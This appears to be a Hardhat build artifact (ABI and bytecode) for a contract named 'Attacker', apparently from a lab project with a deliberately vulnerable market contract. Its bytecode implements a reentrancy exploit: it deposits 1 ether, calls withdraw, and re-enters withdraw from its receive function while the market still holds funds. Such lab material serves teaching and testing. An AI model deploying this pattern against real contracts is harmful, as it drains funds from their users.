{
  "_format": "hh3-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Vulnerable.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_market",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "market",
      "outputs": [
        {
          "internalType": "contract VulnerableMarket",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561000f575f5ffd5b50604051610428380380610428833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b61031c8061010c5f395ff3fe60806040526004361061002c575f3560e01c806380f55605146100f95780639e5faafc14610123576100f5565b366100f557670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100f3575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100dc575f5ffd5b505af11580156100ee573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610104575f5ffd5b5061010d61012d565b60405161011a91906102cd565b60405180910390f35b61012b610151565b005b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101bf575f5ffd5b505af11580156101d1573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561023b575f5ffd5b505af115801561024d573d5f5f3e3d5ffd5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61029561029061028b84610253565b610272565b610253565b9050919050565b5f6102a68261027b565b9050919050565b5f6102b78261029c565b9050919050565b6102c7816102ad565b82525050565b5f6020820190506102e05f8301846102be565b9291505056fea2646970667358221220cc95bd4bd90a7e3f3266b3737e25dc78a32db0eb9d55417557ddeb55d0bbd81164736f6c634300081c0033",
  "linkReferences": {},
  "deployedLinkReferences": {},
  "immutableReferences": {},
  "inputSourceName": "project/contracts/Vulnerable.sol",
  "buildInfoId": "solc-0_8_28-1cb70ba5a5f9300d02441753ca241150de5579ee"
}